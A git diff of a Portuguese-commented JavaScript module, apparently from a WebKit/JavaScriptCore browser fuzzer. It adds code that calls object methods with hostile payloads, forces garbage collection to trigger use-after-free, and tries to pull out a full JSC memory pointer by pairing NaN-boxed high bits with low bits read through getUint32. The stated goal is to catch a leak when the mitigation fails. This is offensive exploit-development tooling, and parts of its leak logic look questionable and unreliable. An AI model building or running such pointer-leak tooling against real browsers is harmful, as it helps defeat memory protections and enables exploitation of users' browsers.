@@ -1,14 +1,24 @@
 
+/**
+ * MÓDULO 3: EXECUTOR & ANALYZER (POINTER HUNTER EDITION)
+ * Foco: Disparar payloads, forçar o GC, e capturar a metade inferior (Low Bits) 
+ * do endereço de memória no milissegundo exato em que a mitigação falha.
+ */
+
 import { GC } from './mod_gc.js';
 
 export const Executor = {
+
+    // Evita que o fuzzer entre em loops infinitos ou apague a tela
     blacklist: ['constructor', 'reload', 'location', 'open', 'alert', 'close'],
 
+    // O Motor Principal (Generator Function)
     run: function*(targets, payloads) {
         let testCount = 0;
 
         for (let target of targets) {
             let obj = target.instance;
+            
             let props = [];
             try {
                 let ownProps = Object.getOwnPropertyNames(obj);
@@ -28,23 +38,49 @@ export const Executor = {
                     let member = obj[prop];
 
                     if (typeof member === 'function') {
+                        // FUZZING DE MÉTODOS
                         for (let p of payloads) {
                             try {
+                                // 1. O Gatilho (Passa o Offset 0 implicitamente ou o payload hostil)
                                 let result = member.call(obj, p.val);
                                 
-                                // O GOLPE DO UAF: Imediatamente após o payload, forçamos o GC!
+                                // 2. O Estresse (Fragmenta a memória)
                                 GC.force();
-                                yield { type: 'GC_TICK' }; // Avisa a UI que o GC rodou
+                                yield { type: 'GC_TICK' }; 
 
+                                // 3. Análise do Retorno
                                 let anomaly = this.analyze(prop, result, `CALL [${p.label}]`);
+                                
                                 if (anomaly) {
+                                    // ==========================================
+                                    // O CAÇADOR DE PONTEIROS (EXTRAÇÃO LOW BITS)
+                                    // ==========================================
+                                    if (result === 0x7ff80000 && typeof obj.getUint32 === 'function') {
+                                        try {
+                                            // Tenta ler os próximos 4 bytes IMEDIATAMENTE (Little-Endian)
+                                            let lowBits = obj.getUint32(4, true); 
+                                            
+                                            let realAddress = "0x" + lowBits.toString(16).padStart(8, '0');
+                                            
+                                            // Concatena o High (7ff80000) com o Low
+                                            let fullPointer = `0x7ff80000${lowBits.toString(16).padStart(8, '0')}`;
+                                            
+                                            anomaly.reason += `<br><br><span style="color:#00ffff; font-size:14px; background:#002222; padding:4px;">[$$$] SUCESSO! PONTEIRO JSC REAL: ${fullPointer}</span>`;
+                                        } catch(e) {
+                                            anomaly.reason += `<br><span style="color:#ff8800;">[!] Falha ao ler os low bits: Mitigação fechou a janela da Race Condition.</span>`;
+                                        }
+                                    }
+                                    // ==========================================
+
                                     yield { type: 'ANOMALY', api: `${target.name}.${prop}`, ...anomaly };
                                 }
                             } catch (e) {}
+                            
                             testCount++;
                             if (testCount % 5 === 0) yield { type: 'TICK', count: testCount };
                         }
                     } else {
+                        // FUZZING DE PROPRIEDADES (GET)
                         let anomaly = this.analyze(prop, member, "GET");
                         if (anomaly) {
                             yield { type: 'ANOMALY', api: `${target.name}.${prop}`, ...anomaly };
@@ -55,20 +91,26 @@ export const Executor = {
                 } catch (e) {}
             }
         }
+        
         yield { type: 'FINISHED', count: testCount };
     },
 
+    // O Analisador Minimizado
     analyze: function(prop, val, action) {
-        if (/^(is|has|can|should)[A-Z]/.test(prop) && val !== undefined && val !== null && typeof val !== 'boolean') {
-            return { action, val, reason: "Type Confusion: C++ retornou não-booleano." };
+        // Ignora valores padrão para focar nos leaks
+        if (val === undefined || val === null || isNaN(val)) return null;
+
+        // Detector de Vazamento de Ponteiro WebKit (NaN-Boxed High Bits)
+        if (typeof val === 'number') {
+            if (val === 0x7ff80000) {
+                return { action, val: `0x7ff80000`, reason: "Leak: Topo do ponteiro capturado! Iniciando extração..." };
+            } 
+            // Detecta outros leaks numéricos bizarros
+            else if (val > 0x10000000 && val !== 2147483647 && val !== Infinity) {
+                return { action, val: `0x${val.toString(16)}`, reason: "Leak: Endereço de memória bruto capturado." };
+            }
         }
-        if (typeof val === 'number' && val > 0x10000000 && val !== 2147483647 && val !== Infinity) {
-            return { action, val: `0x${val.toString(16)}`, reason: "Leak: Endereço bruto capturado!" };
-        }
-        const expectedNulls = ['get', 'getContext', 'exec', 'match', 'getItem', 'querySelector', 'getElementById'];
-        if (val === null && !expectedNulls.includes(prop) && !prop.toLowerCase().includes('element')) {
-            return { action, val, reason: "UAF ACIONADO: C++ retornou Null inesperado após o GC." };
-        }
+
         return null;
     }
 };
